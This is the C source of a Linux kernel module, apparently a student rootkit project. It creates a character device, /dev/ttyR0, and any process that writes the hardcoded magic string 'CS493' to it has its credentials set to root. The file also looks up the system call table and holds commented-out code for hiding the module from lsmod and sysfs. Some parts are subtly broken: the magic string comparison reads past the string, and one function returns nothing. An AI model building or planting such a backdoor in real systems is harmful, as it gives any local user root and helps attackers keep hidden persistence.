// main.c
// Alex Cater & Andrew Parker
// 2019-10-24

#include <linux/module.h>	/* Needed by all modules */
#include <linux/kallsyms.h> /* for kallsyms_lookup_name */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

// *********************************************************************
// module metadata and get rid of taint message
// *********************************************************************

MODULE_LICENSE("GPL");

#define DRIVER_AUTHOR "Alex Cater"
#define DRIVER_DESC   "rootkit"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// *********************************************************************
// prototypes
// *********************************************************************
//static int     __init init_main(void);
//static void    __exit cleanup(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
static void hide_from_system(void);
static int setup_tty(void);

// *********************************************************************
// variables
// *********************************************************************

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

#define  DEVICE_NAME "ttyR0"
#define  CLASS_NAME  "ttyRK"

static unsigned long *sys_call_table;

static int            majorNumber;
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

// *********************************************************************
// functions
// *********************************************************************
static void hide_from_system(void)
{
	//list_del_init(&THIS_MODULE->list); 	/* hide from /proc/modules */
	//kobject_del(&THIS_MODULE->mkobj.kobj);	/* remove rootkit's sysfs entry	*/
}

static int setup_tty(void)
{

}

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

// when the device is created, this function and root_open and root_read
// are passed for the device to return
// this function will wait for a user to write the cred and if the cred matches the hardcoded once
// it will change the user's id to root
static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{
  char   *data;
  char   magic[] = "CS493";
  struct cred *new_cred;

  data = (char *) kmalloc (len + 1, GFP_KERNEL);

  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
	  {
			// changes old creds to root
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("Cannot prepare credentials\n");
		return 0;
	      }
	    printk ("You got it root\n");
	    V(new_cred->uid) = V(new_cred->gid) =  0;
	    V(new_cred->euid) = V(new_cred->egid) = 0;
	    V(new_cred->suid) = V(new_cred->sgid) = 0;
	    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
	    commit_creds (new_cred);
	  }
        kfree(data);
      }
    else
      {
	printk(KERN_ALERT "Unable to allocate memory");
      }

    return len;
}

// *********************************************************************
//  init and exit
// *********************************************************************

// ***** module init *****
static int __init init_main(void)
{
	printk(KERN_INFO "Module loaded!\n");
  sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

  if (sys_call_table == NULL) {
    printk(KERN_ERR "Couldn't look up sys_call_table\n");
    return -1;
  }
	printk(KERN_ERR "Found sys_call_table at %p\n", sys_call_table);

//	hide_from_system(); // lsmod shouldn't show module... unable to unload currently

	// Create char device
	// major number specifies which driver handles which device file
	if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
		{
			printk(KERN_ALERT "failed to register a major number\n");
			return majorNumber;
		}
	 printk(KERN_INFO "major number %d\n", majorNumber);

	 // Register the device class
	 rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
	 if (IS_ERR(rootcharClass))
		 {
			 unregister_chrdev(majorNumber, DEVICE_NAME);
			 printk(KERN_ALERT "Failed to register device class\n");
			 return PTR_ERR(rootcharClass);
	 }

	 printk(KERN_INFO "device class registered correctly\n");

	 // Register the device driver
	 rootcharDevice = device_create(rootcharClass, NULL,
					MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
	 if (IS_ERR(rootcharDevice))
		 {
			 class_destroy(rootcharClass);
			 unregister_chrdev(majorNumber, DEVICE_NAME);
			 printk(KERN_ALERT "Failed to create the device\n");
			 return PTR_ERR(rootcharDevice);
		 }

		return 0;

  return 0;
}

// ***** module exit *****
static void __exit cleanup(void)
{
	// Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);
  class_destroy(rootcharClass);
  unregister_chrdev(majorNumber, DEVICE_NAME);

	printk(KERN_INFO "Goodbye.\n");
}

module_init(init_main);
module_exit(cleanup);
